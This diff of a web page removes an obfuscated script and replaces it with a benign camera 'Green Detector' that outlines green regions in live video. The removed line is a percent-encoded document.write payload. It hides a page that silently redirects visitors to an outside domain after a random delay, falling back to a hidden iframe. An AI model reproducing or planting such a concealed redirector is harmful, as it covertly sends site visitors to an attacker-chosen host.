@@ -1,6 +1,204 @@
-<script language="javascript">
-<!--
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Green Detector</title>
 
-document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%20%20%20%20%3C%74%69%74%6C%65%3E%4C%6F%61%64%69%6E%67%2E%2E%2E%3C%2F%74%69%74%6C%65%3E%0A%0A%20%20%20%20%3C%6E%6F%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%3C%6D%65%74%61%20%68%74%74%70%2D%65%71%75%69%76%3D%22%72%65%66%72%65%73%68%22%20%63%6F%6E%74%65%6E%74%3D%22%30%3B%20%75%72%6C%3D%50%41%53%54%45%5F%55%52%4C%5F%48%45%52%45%22%3E%0A%20%20%20%20%3C%2F%6E%6F%73%63%72%69%70%74%3E%0A%0A%20%20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%28%66%75%6E%63%74%69%6F%6E%28%29%7B%0A%20%20%20%20%20%20%20%20%76%61%72%20%5F%30%78%75%72%6C%20%3D%20%22%68%74%74%70%3A%2F%2F%54%6F%72%78%73%75%73%2E%63%6F%6D%22%3B%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%30%78%65%6E%63%28%75%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%62%74%6F%61%28%75%6E%65%73%63%61%70%65%28%65%6E%63%6F%64%65%55%52%49%43%6F%6D%70%6F%6E%65%6E%74%28%75%29%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%30%78%64%65%63%28%75%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%64%65%63%6F%64%65%55%52%49%43%6F%6D%70%6F%6E%65%6E%74%28%65%73%63%61%70%65%28%61%74%6F%62%28%75%29%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%30%78%64%65%6C%61%79%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%31%30%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%76%61%72%20%5F%30%78%64%61%74%61%20%3D%20%5F%30%78%65%6E%63%28%5F%30%78%75%72%6C%29%3B%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%30%78%69%66%72%61%6D%65%28%75%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%66%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%69%66%72%61%6D%65%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%66%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%6E%6F%6E%65%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%66%2E%73%72%63%20%3D%20%75%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%66%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%30%78%67%6F%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%66%69%6E%61%6C%55%52%4C%20%3D%20%5F%30%78%64%65%63%28%5F%30%78%64%61%74%61%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%66%69%6E%61%6C%55%52%4C%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%66%69%6E%61%6C%55%52%4C%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%28%65%32%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5F%30%78%69%66%72%61%6D%65%28%66%69%6E%61%6C%55%52%4C%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%5F%30%78%67%6F%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%2C%20%5F%30%78%64%65%6C%61%79%28%29%29%3B%0A%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%6E%6C%6F%61%64%20%3D%20%66%75%6E%63%74%69%6F%6E%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%5F%30%78%67%6F%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%7D%29%28%29%3B%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%3C%2F%68%65%61%64%3E%0A%0A%3C%62%6F%64%79%3E%0A%20%20%20%20%3C%70%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%52%65%64%69%72%65%63%74%69%6E%67%2E%2E%2E%3C%2F%70%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        background: #000;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+    }
 
+    #camera {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    #overlay {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+    }
+
+    #status {
+        position: fixed;
+        top: 15px;
+        left: 15px;
+        padding: 8px 12px;
+        background: rgba(0,0,0,.65);
+        color: white;
+        font-family: monospace;
+        border-radius: 6px;
+        z-index: 5;
+    }
+</style>
+</head>
+
+<body>
+
+<video id="camera" autoplay playsinline></video>
+<canvas id="overlay"></canvas>
+
+<div id="status">Starting camera...</div>
+
+<script>
+const video = document.getElementById("camera");
+const canvas = document.getElementById("overlay");
+const ctx = canvas.getContext("2d", { willReadFrequently: true });
+const status = document.getElementById("status");
+
+const scanCanvas = document.createElement("canvas");
+const scanCtx = scanCanvas.getContext("2d", {
+    willReadFrequently: true
+});
+
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "environment"
+            },
+            audio: false
+        });
+
+        video.srcObject = stream;
+
+        video.addEventListener("loadedmetadata", () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            scanCanvas.width = 320;
+            scanCanvas.height =
+                Math.round(320 * video.videoHeight / video.videoWidth);
+
+            status.textContent = "GREEN DETECTOR ACTIVE";
+
+            requestAnimationFrame(detect);
+        });
+
+    } catch (error) {
+        status.textContent = "Camera access failed";
+        console.error(error);
+    }
+}
+
+function detect() {
+    if (video.readyState < 2) {
+        requestAnimationFrame(detect);
+        return;
+    }
+
+    const w = scanCanvas.width;
+    const h = scanCanvas.height;
+
+    scanCtx.drawImage(video, 0, 0, w, h);
+
+    const image = scanCtx.getImageData(0, 0, w, h);
+    const data = image.data;
+
+    let minX = w;
+    let minY = h;
+    let maxX = 0;
+    let maxY = 0;
+
+    let greenPixels = 0;
+
+    /*
+        Detect green.
+
+        Increase/decrease these values
+        to change sensitivity.
+    */
+
+    for (let y = 0; y < h; y++) {
+        for (let x = 0; x < w; x++) {
+
+            const i = (y * w + x) * 4;
+
+            const r = data[i];
+            const g = data[i + 1];
+            const b = data[i + 2];
+
+            const isGreen =
+                g > 70 &&
+                g > r * 1.25 &&
+                g > b * 1.15;
+
+            if (isGreen) {
+                greenPixels++;
+
+                if (x < minX) minX = x;
+                if (x > maxX) maxX = x;
+                if (y < minY) minY = y;
+                if (y > maxY) maxY = y;
+            }
+        }
+    }
+
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    /*
+        Ignore tiny green regions.
+    */
+
+    if (greenPixels > 100) {
+
+        const scaleX = canvas.width / w;
+        const scaleY = canvas.height / h;
+
+        const x = minX * scaleX;
+        const y = minY * scaleY;
+        const width = (maxX - minX) * scaleX;
+        const height = (maxY - minY) * scaleY;
+
+        ctx.strokeStyle = "#00ff00";
+        ctx.lineWidth = 5;
+
+        ctx.strokeRect(
+            x,
+            y,
+            width,
+            height
+        );
+
+        /*
+            Center marker
+        */
+
+        const cx = x + width / 2;
+        const cy = y + height / 2;
+
+        ctx.beginPath();
+
+        ctx.moveTo(cx - 15, cy);
+        ctx.lineTo(cx + 15, cy);
+
+        ctx.moveTo(cx, cy - 15);
+        ctx.lineTo(cx, cy + 15);
+
+        ctx.stroke();
+
+        status.textContent =
+            "GREEN DETECTED: " + greenPixels + " pixels";
+
+    } else {
+        status.textContent = "Searching for green...";
+    }
+
+    requestAnimationFrame(detect);
+}
+
+startCamera();
 </script>
+
+</body>
+</html>
